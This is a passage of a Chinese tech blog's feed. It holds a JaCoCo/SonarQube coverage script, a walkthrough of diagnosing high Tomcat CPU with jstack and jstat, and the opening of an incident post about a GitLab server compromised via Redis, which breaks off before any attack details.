class=&quot;comment&quot;&gt;#判断如果版本未发生变更，则直接合并代码覆盖率数据;如果代码发生变更，则删除历史jacoco.exe覆盖率数据，重新统计&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; [ &lt;span class=&quot;variable&quot;&gt;$lastweek&lt;/span&gt; = &lt;span class=&quot;variable&quot;&gt;$newweek&lt;/span&gt; ];&lt;span class=&quot;keyword&quot;&gt;then&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#sed -i &#39;/sonar.projectVersion/d&#39; sonar-project.properties&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#sed -i &quot;2a sonar.projectVersion=$lastVersion.$time&quot; sonar-project.properties&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ant&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;/Users/yejun/software/sonar-runner-2.4/bin/sonar-runner&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$newweek&lt;/span&gt;&amp;gt;/var/run/coverage.pid&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;rm -rf *.exec&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;sed -i &lt;span class=&quot;string&quot;&gt;&#39;/sonar.projectKey/d&#39;&lt;/span&gt; sonar-project.properties&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;sed -i &lt;span class=&quot;string&quot;&gt;&#39;/sonar.projectVersion/d&#39;&lt;/span&gt; sonar-project.properties&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;sed -i &lt;span class=&quot;string&quot;&gt;&quot;1a sonar.projectKey=vips-mobile-operation-key-&lt;span class=&quot;variable&quot;&gt;$newweek&lt;/span&gt;&quot;&lt;/span&gt; sonar-project.properties&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;sed -i &lt;span class=&quot;string&quot;&gt;&quot;2a sonar.projectVersion=&lt;span class=&quot;variable&quot;&gt;$newversion&lt;/span&gt;&quot;&lt;/span&gt; sonar-project.properties&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ant&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;/Users/yejun/software/sonar-runner-2.4/bin/sonar-runner&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;fi&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;3-被监控机子配置：&quot;&gt;&lt;a href=&quot;#3-被监控机子配置：&quot; class=&quot;headerlink&quot; title=&quot;3.被监控机子配置：&quot;&gt;&lt;/a&gt;3.被监控机子配置：&lt;/h3&gt;&lt;p&gt;1）上传一个jacocoanget.jar文件，文件在jacoco.zip里面，放到一个目录下。例如：/srv/jacoco/jacocoagent.jar&lt;/p&gt;
&lt;p&gt;2) 修改工程tomcat/bin/下的catalina.sh，新增&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;JAVA_OPTS=&lt;span class=&quot;string&quot;&gt;&quot;&lt;span class=&quot;variable&quot;&gt;$JAVA_OPTS&lt;/span&gt; -javaagent:/srv/jacoco/jacocoagent.jar=includes=*,output=tcpserver,port=10001,address=192.168.1.19”&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;参数：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;port:如果一台机子有多个tomcat，注意端口号不要重复&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;address：本机的ip地址&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;其他参数一样。&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;3)配置完以后，到启动jacoco.sh然后执行mvn clean package，就可以到sonarqube上面查看想要的信息了。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;ol&gt;
&lt;li&gt;&lt;p&gt;准备工作：&lt;code&gt;sonarqube，jacoco，git，maven，ant，sonar-runner&lt;/code&gt;&lt;br&gt;sonarqube 去官网下载，文件太大，不能上传&lt;br&gt;git，mavne，ant自己安装&lt;br&gt;sonarqube和son
    
    </summary>
    
      <category term="Java" scheme="http://blog.yangcvo.me/categories/Java/"/>
    
    
      <category term="performance tuning" scheme="http://blog.yangcvo.me/tags/performance-tuning/"/>
    
      <category term="Java" scheme="http://blog.yangcvo.me/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>记录tomcat进程CPU使用率高排查故障经验</title>
    <link href="http://blog.yangcvo.me/2016/12/02/Web%E6%9C%8D%E5%8A%A1%E6%8A%80%E6%9C%AF/tomcat/%E8%AE%B0%E5%BD%95tomcat%E8%BF%9B%E7%A8%8BCPU%E4%BD%BF%E7%94%A8%E7%8E%87%E9%AB%98%E6%8E%92%E6%9F%A5%E6%95%85%E9%9A%9C%E7%BB%8F%E9%AA%8C/"/>
    <id>http://blog.yangcvo.me/2016/12/02/Web服务技术/tomcat/记录tomcat进程CPU使用率高排查故障经验/</id>
    <published>2016-12-02T09:56:03.000Z</published>
    <updated>2017-04-17T09:48:17.000Z</updated>
    
    <content type="html">&lt;h3 id=&quot;1、故障现象&quot;&gt;&lt;a href=&quot;#1、故障现象&quot; class=&quot;headerlink&quot; title=&quot;1、故障现象&quot;&gt;&lt;/a&gt;1、故障现象&lt;/h3&gt;&lt;p&gt;运营同事反馈APP其中体检商城购买订单系统运行缓慢，访问出现超时，多次重启系统后问题依然存在，使用top命令查看服务器情况，发现CPU占用率过高。&lt;/p&gt;
&lt;h3 id=&quot;2、CPU占用过高问题定位&quot;&gt;&lt;a href=&quot;#2、CPU占用过高问题定位&quot; class=&quot;headerlink&quot; title=&quot;2、CPU占用过高问题定位&quot;&gt;&lt;/a&gt;2、CPU占用过高问题定位&lt;/h3&gt;&lt;h5 id=&quot;2-1、定位问题进程&quot;&gt;&lt;a href=&quot;#2-1、定位问题进程&quot; class=&quot;headerlink&quot; title=&quot;2.1、定位问题进程&quot;&gt;&lt;/a&gt;2.1、定位问题进程&lt;/h5&gt;&lt;p&gt;使用top命令查看资源占用情况，发现pid为14063的进程占用了大量的CPU资源，CPU占用率高达229.1%，内存占用率也达到了29.8%&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@account-tomcat-01 ~]$ top&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;top - 14:51:10 up 233 days, 11:40,  2 users,  load average: 6.85, 5.62, 3.97&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Tasks: 192 total,   2 running, 190 sleeping,   0 stopped,   0 zombie&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;%Cpu(s): 97.3 us,  0.3 sy,  0.0 ni,  2.5 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;KiB Mem : 16268652 total,  5114392 free,  6907028 used,  4247232 buff/cache&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;KiB Swap:  4063228 total,  3989708 free,    73520 used.  8751512 avail Mem &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND                                                                                               &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14063 root       20   0 9260488 4.627g  11976 S 229.1 29.8 117:41.66 java&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h5 id=&quot;2-2、定位问题线程&quot;&gt;&lt;a href=&quot;#2-2、定位问题线程&quot; class=&quot;headerlink&quot; title=&quot;2.2、定位问题线程&quot;&gt;&lt;/a&gt;2.2、定位问题线程&lt;/h5&gt;&lt;p&gt;使用&lt;code&gt;ps -mp pid -o THREAD,tid,time&lt;/code&gt;命令查看该进程的线程情况，发现该进程的多个线程占用率很高&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@account-tomcat-01 ~]$ ps -mp 14063 -o THREAD,tid,time &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;USER     %CPU PRI SCNT WCHAN  USER SYSTEM   TID     TIME&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        361   -    - -         -      -     - 02:05:58&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;root       0.0  19    - futex_    -      - 14063 00:00:00&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;root       0.0  19    - poll_s    -      - 14064 00:00:00&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;root      44.5  19    - -         -      - 14065 00:15:30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;root      44.5  19    - -         -      - 14066 00:15:30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;root      44.4  19    - -         -      - 14067 00:15:29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;root      44.5  19    - -         -      - 14068 00:15:30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;root      44.5  19    - -         -      - 14069 00:15:30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;root      44.5  19    - -         -      - 14070 00:15:30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;root      44.5  19    - -         -      - 14071 00:15:30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;root      44.6  19    - -         -      - 14072 00:15:32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;root       2.2  19    - futex_    -      - 14073 00:00:46&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;root       0.0  19    - futex_    -      - 14074 00:00:00&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;root       0.0  19    - futex_    -      - 14075 00:00:00&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;root       0.0  19    - futex_    -      - 14076 00:00:00&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;root       0.7  19    - futex_    -      - 14077 00:00:15&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;从输出信息可以看出，14065~14072之间的线程CPU占用率都很高&lt;br&gt;2.3、查看问题线程堆栈&lt;/p&gt;
&lt;p&gt;挑选TID为14065的线程，查看该线程的堆栈情况，先将线程id转为16进制，使用printf “%x\n” tid命令进行转换&lt;/p&gt;
&lt;figure class=&quot;highlight nix&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@account-tomcat-&lt;span class=&quot;number&quot;&gt;01&lt;/span&gt; ~]$ printf &lt;span class=&quot;string&quot;&gt;&quot;%x\n&quot;&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;14065&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;36&lt;/span&gt;f1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;再使用jstack命令打印线程堆栈信息，命令格式：jstack pid |grep tid -A &lt;span class=&quot;number&quot;&gt;30&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@root-web-&lt;span class=&quot;number&quot;&gt;01&lt;/span&gt; ~]$ jstack &lt;span class=&quot;number&quot;&gt;14063&lt;/span&gt; |grep &lt;span class=&quot;number&quot;&gt;36&lt;/span&gt;f1 -A &lt;span class=&quot;number&quot;&gt;30&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&quot;GC task thread#0 (ParallelGC)&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;prio=10&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;tid=0x00007fa35001e800&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;nid=0x36f1&lt;/span&gt; runnable &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&quot;GC task thread#1 (ParallelGC)&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;prio=10&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;tid=0x00007fa350020800&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;nid=0x36f2&lt;/span&gt; runnable &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&quot;GC task thread#2 (ParallelGC)&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;prio=10&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;tid=0x00007fa350022800&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;nid=0x36f3&lt;/span&gt; runnable &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&quot;GC task thread#3 (ParallelGC)&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;prio=10&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;tid=0x00007fa350024000&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;nid=0x36f4&lt;/span&gt; runnable &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&quot;GC task thread#4 (ParallelGC)&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;prio=10&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;tid=0x00007fa350026000&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;nid=0x36f5&lt;/span&gt; runnable &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&quot;GC task thread#5 (ParallelGC)&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;prio=10&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;tid=0x00007fa350028000&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;nid=0x36f6&lt;/span&gt; runnable &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&quot;GC task thread#6 (ParallelGC)&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;prio=10&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;tid=0x00007fa350029800&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;nid=0x36f7&lt;/span&gt; runnable &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&quot;GC task thread#7 (ParallelGC)&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;prio=10&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;tid=0x00007fa35002b800&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;nid=0x36f8&lt;/span&gt; runnable &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&quot;VM Periodic Task Thread&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;prio=10&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;tid=0x00007fa3500a8800&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;nid=0x3700&lt;/span&gt; waiting on condition &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;JNI global references: &lt;span class=&quot;number&quot;&gt;392&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;从输出信息可以看出，此线程是JVM的gc线程。此时可以基本确定是内存不足或内存泄露导致gc线程持续运行，导致CPU占用过高。&lt;/p&gt;
&lt;p&gt;所以接下来我们要找的内存方面的问题&lt;/p&gt;
&lt;p&gt;3.1、使用jstat -gcutil命令查看进程的内存情况&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@account-tomcat-01 ~]$ jstat -gcutil 14063 2000 10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  S0     S1     E      O      P     YGC     YGCT    FGC    FGCT     GCT   &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  0.00   0.00 100.00  99.99  26.31     42   21.917   218 1484.830 1506.747&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  0.00   0.00 100.00  99.99  26.31     42   21.917   218 1484.830 1506.747&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  0.00   0.00 100.00  99.99  26.31     42   21.917   219 1496.567 1518.484&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  0.00   0.00 100.00  99.99  26.31     42   21.917   219 1496.567 1518.484&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  0.00   0.00 100.00  99.99  26.31     42   21.917   219 1496.567 1518.484&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  0.00   0.00 100.00  99.99  26.31     42   21.917   219 1496.567 1518.484&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  0.00   0.00 100.00  99.99  26.31     42   21.917   219 1496.567 1518.484&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  0.00   0.00 100.00  99.99  26.31     42   21.917   220 1505.439 1527.355&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  0.00   0.00 100.00  99.99  26.31     42   21.917   220 1505.439 1527.355&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  0.00   0.00 100.00  99.99  26.31     42   21.917   220 1505.439 1527.355&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;从输出信息可以看出，Eden区内存占用100%，Old区内存占用99.99%，Full GC的次数高达220次，并且频繁Full GC，Full GC的持续时间也特别长，平均每次Full GC耗时6.8秒（1505.439/220）。根据这些信息，基本可以确定是程序代码上出现了问题，可能存在不合理创建对象的地方。&lt;/p&gt;
&lt;p&gt;生产java应用，CPU使用率一直很高，经常达到100%，通过以下步骤完美解决，分享一下。&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1.jps 获取Java进程的PID。&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2.top -H -p PID 查看对应进程的哪个线程占用CPU过高。&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2.1 使用 ps -mp pid -o THREAD,tid,time 命令查看该进程的线程情况，发现该进程的多个线程占用率很高。&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3.jstack pid &amp;gt;&amp;gt; java.txt 导出CPU占用高进程的线程栈。&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;使用jstack命令查看进程的堆栈情况&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4.echo “obase=16; PID” | bc 将线程的PID转换为16进制。&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5.在第二步导出的Java.txt中查找转换成为16进制的线程PID。找到对应的线程栈。&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6.分析负载高的线程栈都是什么业务操作。优化程序并处理问题。&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
</content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;1、故障现象&quot;&gt;&lt;a href=&quot;#1、故障现象&quot; class=&quot;headerlink&quot; title=&quot;1、故障现象&quot;&gt;&lt;/a&gt;1、故障现象&lt;/h3&gt;&lt;p&gt;运营同事反馈APP其中体检商城购买订单系统运行缓慢，访问出现超时，多次重启系统后问题依然存在，使用top命令
    
    </summary>
    
      <category term="Java" scheme="http://blog.yangcvo.me/categories/Java/"/>
    
    
      <category term="performance tuning" scheme="http://blog.yangcvo.me/tags/performance-tuning/"/>
    
      <category term="Java" scheme="http://blog.yangcvo.me/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>gitlab网站被黑redis被劫持6379端口需要提交认证，如何挽救？</title>
    <link href="http://blog.yangcvo.me/2016/12/02/%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8/gitlab%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%91redis%E8%A2%AB%E5%8A%AB%E6%8C%816379%E7%AB%AF%E5%8F%A3%E9%9C%80%E8%A6%81%E6%8F%90%E4%BA%A4%E8%AE%A4%E8%AF%81%EF%BC%8C%E5%A6%82%E4%BD%95%E6%8C%BD%E6%95%91%EF%BC%9F/"/>
    <id>http://blog.yangcvo.me/2016/12/02/运维安全/gitlab网站被黑redis被劫持6379端口需要提交认证，如何挽救？/</id>
    <published>2016-12-02T04:07:27.000Z</published>
    <updated>2017-03-14T05:53:06.000Z</updated>
    
    <content type="html">&lt;p&gt;今天早上5点多收到阿里云的告警：服务器CPU百分百，gitlab服务器访问出现500，第一时间排查问题。&lt;br&gt;毕竟这个关乎着开发今天可能无法提交代码。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_01.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/anquan_gitlab_02.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h4 id=&quot;第一时间我查看什么原因导致我gitlab-500。&quot;&gt;&lt;a href=&quot;#第一时间我查看什么原因导致我gitlab-500。&quot; class=&quot;headerlink&quot; title=&quot;第一时间我查看什么原因导致我gitlab 500。&quot;&gt;&lt;/a&gt;第一时间我查看什么原因导致我gitlab 500。&lt;/h4&gt;&lt;p&gt;根据以往经验gitlab出现500 第一：版本出现bug，第二：服务器网络不正常，请求不到。&lt;/p&gt;
&lt;p&gt;然后查看日志：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@GitLab ~]&lt;span class=&quot;comment&quot;&gt;# tailf -1000 